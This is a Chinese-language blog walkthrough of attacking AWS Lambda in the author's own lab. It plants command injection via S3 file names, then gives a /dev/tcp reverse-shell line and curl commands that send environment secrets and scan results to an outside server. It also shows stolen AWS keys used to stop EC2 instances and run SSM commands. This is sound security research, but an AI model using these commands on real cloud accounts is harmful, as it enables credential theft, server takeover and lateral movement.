# 前言

### 1、这篇文章讲了什么？

文本围绕三个问题

1、lambda会遇到什么攻击场景

2、什么情况下，在lambda中读取到的env环境变量密钥可以让我们接管服务器甚至整个账号

3、什么情况下，可以通过lambda权限去横向到其他的EC2服务器

本文会对这三个问题进行解答，并且进行演示

### 2、什么是ServerLess和Lambda

 **Serverless** ，即 **无服务器计算**
。然而Serverless不是不再需要服务器，而是公司或开发者不用过多考虑服务器的问题，计算资源仅作为一种服务而不再以物理硬件的形式出现。

![image-20220609111922328](https://image.3001.net/images/20220610/1654856699_62a31bfb7818a7aaf832c.png!small)

 **为什么使用ServerLess**

Serverless免除公司和开发者对服务器维护的麻烦，因此也不用考虑DevOps了。公司和开发者只需关注应用的开发和运维即可，因此Serverless可以在更大程度上节约运维的成本。

 **Serverless的优势**

  * 可用性冗余，以便单个机器故障不会导致服务中断

  * 冗余副本的地理分布，以便在发生灾难时保留服务

  * 负载平衡和请求路由以有效利用资源

  * 响应负载变化进行自动缩放以扩展或缩小系统

  * 监控以确保服务仍然运行良好

  * 记录以记录调试或性能调整所需的消息

  * 系统升级，包括安全修补

  * 迁移到新实例时可用

选自阿里云

> https://www.alibabacloud.com/zh/knowledge/what-is-serverless

# 一、场景搭建与实践

> https://us-east-1.console.aws.amazon.com/lambda/home?region=us-> east-1#/create/function

## 1、创建一个lambda函数

![img](https://image.3001.net/images/20220610/1654856702_62a31bfe5208060fa83a0.png!small)

这里都是用默认的设置  
![img](https://image.3001.net/images/20220610/1654856704_62a31c00ac30e5630ead6.png!small)  
并且我们对执行的角色也是用默认的选项  
![img](https://image.3001.net/images/20220610/1654856706_62a31c021e275f7dedf62.png!small)在高级设置中，我们也保持默认

## 2、为lambda函数添加触发器

在编写函数代码之前，我们需要添加触发器  
![img](https://image.3001.net/images/20220610/1654856707_62a31c03b32a932d9c910.png!small)为了演示方便，我们不去考虑这个函数在业务中的具体作用，只需在意这个函数在什么时候触发即可  
首先我们创建一个S3 存储桶  
![img](https://image.3001.net/images/20220610/1654856709_62a31c055f01ff91e5a43.png!small)并且我们在刚刚创建的函数添加触发器，并且选择这个存储桶，触发的事件类型也选择所有对象创建事件  
![img](https://image.3001.net/images/20220610/1654856710_62a31c06a37389a177643.png!small)![img](https://image.3001.net/images/20220610/1654856713_62a31c090eba6ba66ca3b.png!small)在我们开始编写函数前，我们需要知道，在S3上传对象时，所获取到的内容是什么样子的  
上传一个文件，触发一下日志  
![img](https://image.3001.net/images/20220610/1654856716_62a31c0c5b628a0668560.png!small)随后在cloud
watch中就可以看到上传的日志  
![img](https://image.3001.net/images/20220610/1654856718_62a31c0e086705957bbb5.png!small)这里可以看到object中的key是上传的文件名，那假设函数获取的文件名并且当成命令执行，那么在上传文件时如果未对文件进行重命名就会造成问题，或者更加直接一些，我们直接获取文件的内容，将内容当做命令执行，或者写一个flask或者django的服务来接收参数然后执行命令

> 这里看上去会比较鸡肋，因为毕竟太刻意了，黑盒模式下也不太好遇上，这里的举例只做研究使用

我们将这里的Json数据取出来，然后丢到lambda测试，这样更加方便

![image-20220608145109554](https://image.3001.net/images/20220610/1654856720_62a31c107fa670238b523.png!small)

![image-20220608145212111](https://image.3001.net/images/20220610/1654856722_62a31c12c4a57161e461b.png!small)

这里我们主要关注这个event，对event的数据进行处理

    
    
    import json
    
    
    def lambda_handler(event, context):
        for i in event['Records']:
            getObjectName = i['s3']['object']['key']
            print(getObjectName)
    

这样可以单独把文件名取出来

![image-20220608145837252](https://image.3001.net/images/20220610/1654856724_62a31c1440548abe045e0.png!small)

开始对这个文件名进行处理，直接使用Split函数对文件名进行.号分割，取下标值即可取到文件名

    
    
    import json
    import os
    
    def lambda_handler(event, context):
        for i in event['Records']:
            getObjectName = i['s3']['object']['key']
            getSplitObjectName = getObjectName.split('.')
            os.system(getSplitObjectName[0])
    

为了方便测试 手动把测试数据的KEY改为whoami.jpeg

![image-20220608150247037](https://image.3001.net/images/20220610/1654856725_62a31c15b0dcc908e6611.png!small)

点击Test函数，查看返回结果

![image-20220608150346833](https://image.3001.net/images/20220610/1654856727_62a31c17978d938bda6cf.png!small)

## 3、执行命令

### 3.1、反弹shell

那么此时尝试反弹Shell，看看是否能弹回来

    
    
    exec /bin/sh 0</dev/tcp/ip/1234 1>&0 2>&0
    

代码需要改成下面这样

    
    
    import json
    import os
    
    def lambda_handler(event, context):
        for i in event['Records']:
            getObjectName = i['s3']['object']['key']
            getSplitObjectName = getObjectName.rsplit('.', 1)
            print((getSplitObjectName))
    

为什么要用rsplit而不用split呢？因为只需要取最后一个.点开始分割，如果使用split，会把IP地址也进行分割

    
    
    import json
    import os
    
    def lambda_handler(event, context):
        try:
            for i in event['Records']:
                getObjectName = i['s3']['object']['key']
                getSplitObjectName = getObjectName.rsplit('.', 1)
                os.system(getSplitObjectName[0])
        except Except as e:
            print(e)
    

将这个代码更新到lambda函数中，随后运行Test

![image-20220608151624809](https://image.3001.net/images/20220610/1654856728_62a31c18e8630a13b1c8f.png!small)

NC监听发现，这里会显示有连接过来，但是会超时，导致连不上，我一开始以为是国内服务器的问题，换了一台香港服务器也还是如此

既然反弹Shell失败的话，我们先暂且不去研究到底是为什么导致无法连接，那么能不能读env信息呢？答案是可以的

### 3.2、读取env信息

用DNSLOG外带平台，或者NC监听都行

> https://app.interactsh.com/#/

这里使用服务器来NC监听，然后使用curl来进行请求

    
    
    curl -X POST -d  \"`env`\" vps:80.jpeg
    

![image-20220608153020402](https://image.3001.net/images/20220610/1654856732_62a31c1c28c5b2c4fc301.png!small)

从图片中可以看到，将env信息带了出来，那么此时有AWS_ACCESS_KEY_ID和AWS_SECRET_ACCESS_KEY，可以进行利用吗？

首先我们看一这个Key能做一些什么？

#### 3.2.1、黑盒盲猜Key的权限

这里肯定会遇到一个问题，将ID和KEY配置到aws cli中会出现下面的情况

![image-20220608153903419](https://image.3001.net/images/20220610/1654856738_62a31c22131f3e6bb9b70.png!small)

> An error occurred (AuthFailure) when calling the DescribeInstances
> operation: AWS was not able to validate the provided access credentials

这里提示我们，AWS无法验证所提供的的凭证，那么是写错了吗？其实还需要提供上面的token，如何添加？

    
    
    vim ~/.aws/credentials
    

加上aws_session_token = xxxx

![image-20220608154050046](https://image.3001.net/images/20220610/1654856739_62a31c23316f478a6a279.png!small)

在执行列EC2的命令，就会提示没有权限

    
    
    aws ec2 describe-instances
    

但是这里有这么多的API，怎么知道这个KEY有什么权限呢？这就需要切换到白盒的方式，因为创建lambda函数的时候，所有的配置都是用的默认的，这个时候，只需要确定默认配置创建的IAM给的权限是多少即可

来到IAM，查看这个系统创建的角色有哪些权限

![image-20220608154343776](https://image.3001.net/images/20220610/1654856741_62a31c25b09f30c6e60d0.png!small)

点击策略名称

![image-20220608154549587](https://image.3001.net/images/20220610/1654856744_62a31c28318ca0cbee981.png!small)

进去之后可以发现，只有三个权限

1、CreateLogGroup-创建日志组

>
> https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_CreateLogGroup.html

2、CreateLogStream-创建日志流

>
> https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_CreateLogStream.html

3、PutLogEvents-将日志事件上传到指定的日志流

>
> https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_PutLogEvents.html

![image-20220608154515602](https://image.3001.net/images/20220610/1654856745_62a31c29cb814c9237904.png!small)

![image-20220608155342855](https://image.3001.net/images/20220610/1654856747_62a31c2b27a8978aff456.png!small)

# 二、提出问题

那么至此，我们需要考虑两个问题

1、在什么情况下，这里的IAM密钥，能让我们控制EC2服务器，甚至接管整个账号？

2、在lambda函数中，就算是打穿了，那也是在云厂商提供的环境中，与企业的服务器还是有隔离的，那么什么情况下，会影响到企业的服务器？，也就是我们如何横向去攻击其他的服务器？

# 三、什么情况下，读取到的env密钥可以让我们接管服务器甚至整个账号？

从这里的IAM来看，env里面的密钥权限肯定来自于我们创建lambda函数时，让我们选择是自动新建角色，还是使用现有角色这里

![image-20220608155908356](https://image.3001.net/images/20220610/1654856748_62a31c2c738dafe0954ab.png!small)

这里选择使用现有的角色，然后去IAM创建一个

![image-20220608160421093](https://image.3001.net/images/20220610/1654856750_62a31c2ed5a63f8743615.png!small)

这里选择Lambda，因为是给Lambda这个服务使用的

![image-20220608160156922](https://image.3001.net/images/20220610/1654856753_62a31c31173a0954b7e9e.png!small)

这里可以看到这一条策略

> Provides full access to Amazon EC2 via the AWS Management Console.

也就代表着可以通过控制台访问所有的EC2服务

![image-20220608160754541](https://image.3001.net/images/20220610/1654856755_62a31c33da6e3db975a33.png!small)

创建完成后，分配给Lambda

 **Tips**

这里的可信实体一定要是AWS服务:lambda，不然在lambda函数中是选不到这个角色的

![image-20220608160840061](https://image.3001.net/images/20220610/1654856757_62a31c35c4ebec019e3f2.png!small)

随后回到lambda，点击一下刷新，就可以看到新建的角色了

![image-20220608160916343](https://image.3001.net/images/20220610/1654856758_62a31c36d06b6d7abfdd8.png!small)

创建函数，再尝试把env信息读出来

![image-20220608161136013](https://image.3001.net/images/20220610/1654856760_62a31c38f0187ac2730b9.png!small)

虽然这个函数执行失败了，但是收到了请求，无伤大雅，现在尝试对这里的AK/KEY进行利用

在此之前，使用尊贵的AWS12月免费账户启动一个EC2

![image-20220608161355605](https://image.3001.net/images/20220610/1654856767_62a31c3f003b3efb3a545.png!small)

    
    
    vim ~/.aws/credentials
    

![image-20220608161618832](https://image.3001.net/images/20220610/1654856768_62a31c404b31b56974d73.png!small)

写入刚刚获取到的AK/ID还有token

列出账号下的EC2

    
    
    aws ec2 describe-instances
    

![image-20220608161707481](https://image.3001.net/images/20220610/1654856770_62a31c4238301d1540e24.png!small)

这里返回为空，可能有人会认为是不是执行失败了，其实是成功了，证明我们获取到的AK/ID是有EC2权限的，因为如果执行失败的话会返回AccessDenid，那么我们刚刚启动了一个EC2，但是这里不显示是为什么呢？这就是AWS地区的问题了，使用下面的命令，换一个地区尝试一下

    
    
    aws configure
    

![image-20220608161837089](https://image.3001.net/images/20220610/1654856770_62a31c42d931576736a0f.png!small)

这里的地区目前是显示在首尔，但是我们的服务器是在弗吉尼亚北部us-east-1，切换一下地区即可

![image-20220608162010949](https://image.3001.net/images/20220610/1654856771_62a31c43d37c65a63bc0b.png!small)

再执行列出EC2的命令，就可以了

    
    
    aws ec2 describe-instances
    

![image-20220608162123305](https://image.3001.net/images/20220610/1654856772_62a31c44cdcd8abec2ff2.png!small)

现在已经是有权限的，那么能否在EC2中执行命令呢？

> 这里的命令，我就照搬TeamsSix的文章了: https://zone.huoxian.cn/d/1022-aws-ec2

1、列出目标实例的ID

    
    
    aws ec2 describe-instances --filters "Name=instance-type,Values=t2.micro" --query "Reservations[].Instances[].InstanceId"
    

![image-20220608162503124](https://image.3001.net/images/20220610/1654856774_62a31c46c1229496b7b3f.png!small)

2、在指定的EC2上执行命令

    
    
    aws ssm send-command \
        --instance-ids "i-03f69896b608efa53" \
        --document-name "AWS-RunShellScript" \
        --parameters commands=ifconfig \
        --output text
    

![image-20220608162659914](https://image.3001.net/images/20220610/1654856775_62a31c47c2f94a56fd300.png!small)

但是此时会提示我们并没有权限执行命令，会IAM看一下

![image-20220608162924675](https://image.3001.net/images/20220610/1654856777_62a31c492dd3cba58533a.png!small)

我们这里使用的是SSM，所以需要附加SSM的权限，也就是Aws Systems Manager

> https://docs.aws.amazon.com/zh_cn/systems-manager/latest/userguide/what-is-> systems-manager.html

但是已经不重要了，我们可以现在对EC2进行增加，停止，删除了，用下面的命令可以停止指定的EC2

    
    
    aws ec2 stop-instances --instance-ids 这里写EC2的ID
    

![image-20220608163305057](https://image.3001.net/images/20220610/1654856779_62a31c4b661aeda0e4c0c.png!small)

此时可以看到我们的EC2已经被停止了

![image-20220608163356529](https://image.3001.net/images/20220610/1654856780_62a31c4ca70fb092296ae.png!small)

那么就是想执行命令，能执行吗？答案是可以的，只需要在角色中添加SSM即可

![image-20220608234931038](https://image.3001.net/images/20220610/1654856782_62a31c4e1a5b354f9c549.png!small)

将这个权限附加到UzJuFullEC2的角色中，然后需要重新获取Token，因为这里改了之后，在env中的AK和KEY就变了

![image-20220608234952904](https://image.3001.net/images/20220610/1654856783_62a31c4f6cf0342865025.png!small)

然后我们再执行命令会发现提示无效，原因是因为服务器的agent未在线

    
    
    systemctl status amazon-ssm-agen
    

![image-20220608235050612](https://image.3001.net/images/20220610/1654856784_62a31c505d21468b11e23.png!small)

这个时候就需要去EC2中添加IAM

右键EC2选择安全-修改IAM

![image-20220608235147022](https://image.3001.net/images/20220610/1654856785_62a31c517bdf7dd0f0d08.png!small)

![image-20220608235220718](https://image.3001.net/images/20220610/1654856787_62a31c5341e74246f5aee.png!small)

![image-20220608235234734](https://image.3001.net/images/20220610/1654856788_62a31c5486f2846e803df.png!small)

然后再执行命令

    
    
    aws ssm send-command \
        --instance-ids "i-05d0f910ec24e2c22" \
        --document-name "AWS-RunShellScript" \
        --parameters commands=ifconfig \
        --output text
    

获取输出

    
    
    aws ssm list-command-invocations \
        --command-id 9acde1bb-f93f-40b0-a038-94dc74b4c390 \
        --details
    

![image-20220609000800612](https://image.3001.net/images/20220610/1654856789_62a31c55aa0c8e7484b33.png!small)

# 四、什么情况下，可以通过获取lambda权限横向到其他服务器?

这里就要说到，在创建Lambda函数的时候，有一个高级选项，可以分配VPC

![image-20220608170822077](https://image.3001.net/images/20220610/1654856792_62a31c5819c46716557dd.png!small)

创建成功后，现在lambda函数就与EC2服务器在同一个VPC中

![image-20220608171528947](https://image.3001.net/images/20220610/1654856793_62a31c59e4399caf77d6f.png!small)

![image-20220608171632105](https://image.3001.net/images/20220610/1654856795_62a31c5b885f71502c647.png!small)

随后首先使用证书登录到服务器

![image-20220608172118157](https://image.3001.net/images/20220610/1654856799_62a31c5f9fbbfe26fcba0.png!small)

验证一下现在lambda函数是否能访问到这个EC2，只需要在这个EC2中开启一个HTTP服务即可

 **PS**

这里有个比较小丑的事情。。。

![image-20220608174950371](https://image.3001.net/images/20220610/1654856800_62a31c60e47964917327b.png!small)

我在EC2中开启监听，然后lambda
访问EC2的内网地址，按道理来说应该是能访问到的，可以把VPC理解为局域网，但是就是访问不到，然后lambda函数执行超时，气急败坏上了fscan

![image-20220608175121879](https://image.3001.net/images/20220610/1654856801_62a31c61e221fc82b9d16.png!small)

后来才发现，是因为EC2的安全组只放了22。。所以才访问不到的，现在改成全开的情况

![image-20220608175203217](https://image.3001.net/images/20220610/1654856803_62a31c6391abd51117162.png!small)

放通安全组之后，lambda可以成功访问到我的EC2了

![image-20220608175244537](https://image.3001.net/images/20220610/1654856804_62a31c64c3c2fde3e5bcc.png!small)

这里插一个小插曲，在上面我们没解决公网没办法反弹shell的问题，那么内网可以吗？尝试了一下，还是不可以

![image-20220608175519224](https://image.3001.net/images/20220610/1654856807_62a31c672a3a0dec8cb2d.png!small)

跟公网一个情况，会自动断开，那么回到正题

![image-20220608175621649](https://image.3001.net/images/20220610/1654856808_62a31c68002e0ad796b39.png!small)

把lambda函数的VPC取消，那么还能访问吗？

![image-20220608175837152](https://image.3001.net/images/20220610/1654856809_62a31c695492dd86d8e6a.png!small)

可以看到，如果将VPC取消之后，lambda函数就没有办法访问EC2

现在再考虑一个问题，能不能反向查找，现在的情况是，我们控制了EC2，可以用fscan等扫描工具来判断内网存在哪些机器，那么能不能反过来，在lambda函数上装一个kscan来判断VPC中有多少个EC2

    
    
    curl -O http://172.31.92.92/kscan_linux_amd64
    

这里不能直接存，因为是只读的

> 这里的图片是fscan，因为边做边写的时候图片没换，就懒得重新弄了
>
> 为什么不用fscan，因为没有root权限，icmp没权限

![image-20220608180553150](https://image.3001.net/images/20220610/1654856811_62a31c6be60bbc19d10ed.png!small)

但是可以存在tmp目录下，用curl -小写的o

    
    
    curl -o /tmp/kscan http://172.31.92.92/kscan_linux_amd64
    

![image-20220608180502715](https://image.3001.net/images/20220610/1654856813_62a31c6d23616c7647f7c.png!small)

![image-20220608230121328](https://image.3001.net/images/20220610/1654856813_62a31c6dcc8453c25e36a.png!small)

下载成功，给一下权限

    
    
    chmod 777 /tmp/kscan.jpeg
    

这里直接运行是不行的，需要给权限

![image-20220608230243831](https://image.3001.net/images/20220610/1654856814_62a31c6ebfe249a0737cd.png!small)

    
    
    chmod 777 /tmp/kscan
    

然后再次运行

    
    
    /tmp/kscan --spy 172.31.0.0/16 --scan -t 200 > /tmp/ok.txt.jpeg
    

这里执行的时候有个小Tips

![image-20220608230727954](https://image.3001.net/images/20220610/1654856816_62a31c700e575d75ac907.png!small)

这里会一直转圈圈，因为这里有个超时限制，正常是3秒，如果设置是默认3秒的话，这里就会执行失败，因为等待太久了，在扫描，所以需要配置一下超时时间，我这里配置成了10分钟

![image-20220608230829593](https://image.3001.net/images/20220610/1654856818_62a31c72b776b853d61c6.png!small)

![image-20220608230419143](https://image.3001.net/images/20220610/1654856820_62a31c744acfe4bf684da.png!small)

现在可以看到里面有数据了，cat看一下内容

    
    
    cat /tmp/ok.txt
    

![image-20220608230920376](https://image.3001.net/images/20220610/1654856821_62a31c759c5563428a4be.png!small)

可以看到这里所探测到的就是我们创建的EC2

![image-20220608230946560](https://image.3001.net/images/20220610/1654856824_62a31c78ad05e9e0f1240.png!small)

然后可以利用CURL带出来

    
    
    curl -X POST -d  \"`cat /tmp/ok2.txt`\" 172.31.92.92:800.jpeg
    

![image-20220608231315930](https://image.3001.net/images/20220610/1654856826_62a31c7add2a248906e4c.png!small)

# 五、总结

### 1、lambda的攻击方式

与常见的漏洞利用方式类似，对外部输入并不可控造成的

### 2、什么情况下获取的env密钥可以接管服务器或者账号？

lambda必须拥有自定义的IAM角色

[AmazonEC2FullAccess](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonEC2FullAccess)

### 3、什么情况下获取到的env密钥可以执行命令？

lambda的IAM角色必须拥有

[AmazonSSMFullAccess](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonSSMFullAccess)

[AmazonEC2RoleforSSM](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM)

### 4、什么情况下可以通过lambda去横向到其他服务器？

lambda必须绑定VPC

即在同一个VPC内网中即可扫描探测到存活的服务器内网地址

### 5、云安全靶场-TerraformGoat

https://github.com/HuoCorp/TerraformGoat

![image-20220609004039628](https://image.3001.net/images/20220610/1654856829_62a31c7da585c6cc1fb4d.png!small)

